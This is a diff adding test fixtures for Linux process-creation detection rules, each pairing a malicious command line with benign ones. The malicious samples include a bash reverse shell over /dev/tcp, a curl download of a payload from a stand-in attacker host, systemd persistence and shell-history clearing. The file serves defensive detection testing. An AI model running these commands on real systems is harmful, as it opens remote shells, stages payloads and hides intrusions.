@@ -1987,5 +1987,113 @@
         "CommandLine": "makecab.exe C:\\data\\file.txt C:\\output\\file.cab"
       }
     ]
+  },
+  "proc_creation_lnx_reverse_shell_interpreter.yml": {
+    "true_positive": {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+    },
+    "true_negatives": [
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "bash -c 'echo hello'"
+      },
+      {
+        "Image": "/usr/bin/nc",
+        "CommandLine": "nc -l -p 4444"
+      },
+      {
+        "Image": "/usr/bin/python3",
+        "CommandLine": "python3 script.py"
+      },
+      {
+        "Image": "/usr/bin/socat",
+        "CommandLine": "socat TCP-LISTEN:4444 STDOUT"
+      }
+    ]
+  },
+  "proc_creation_lnx_ingress_tool_transfer.yml": {
+    "true_positive": {
+      "Image": "/usr/bin/curl",
+      "CommandLine": "curl http://evil.example/payload.sh -o /tmp/payload.sh"
+    },
+    "true_negatives": [
+      {
+        "Image": "/usr/bin/curl",
+        "CommandLine": "curl https://example.com/index.html -o /home/user/index.html"
+      },
+      {
+        "Image": "/usr/bin/wget",
+        "CommandLine": "wget https://example.com/file.tar.gz"
+      },
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "echo hi | bash"
+      }
+    ]
+  },
+  "proc_creation_lnx_cron_at_persistence.yml": {
+    "true_positive": {
+      "Image": "/usr/bin/crontab",
+      "CommandLine": "crontab -e"
+    },
+    "true_negatives": [
+      {
+        "Image": "/usr/bin/crontab",
+        "CommandLine": "crontab -l"
+      },
+      {
+        "Image": "/usr/bin/crontab",
+        "CommandLine": "crontab -r"
+      },
+      {
+        "Image": "/bin/ls",
+        "CommandLine": "ls -la /etc/cron.d/"
+      },
+      {
+        "Image": "/bin/cat",
+        "CommandLine": "cat /etc/cron.d/existing-job"
+      }
+    ]
+  },
+  "proc_creation_lnx_shell_history_tamper.yml": {
+    "true_positive": {
+      "Image": "/bin/bash",
+      "CommandLine": "history -c"
+    },
+    "true_negatives": [
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "history | grep ssh"
+      },
+      {
+        "Image": "/bin/cat",
+        "CommandLine": "cat ~/.bash_history"
+      },
+      {
+        "Image": "/bin/ln",
+        "CommandLine": "ln -sf /dev/null /tmp/scratch-link"
+      }
+    ]
+  },
+  "proc_creation_lnx_systemd_service_persistence.yml": {
+    "true_positive": {
+      "Image": "/usr/bin/systemctl",
+      "CommandLine": "systemctl enable evil.service"
+    },
+    "true_negatives": [
+      {
+        "Image": "/usr/bin/systemctl",
+        "CommandLine": "systemctl status sshd"
+      },
+      {
+        "Image": "/usr/bin/systemctl",
+        "CommandLine": "systemctl restart nginx"
+      },
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "bash -c 'echo test > /tmp/test.txt'"
+      }
+    ]
   }
 }
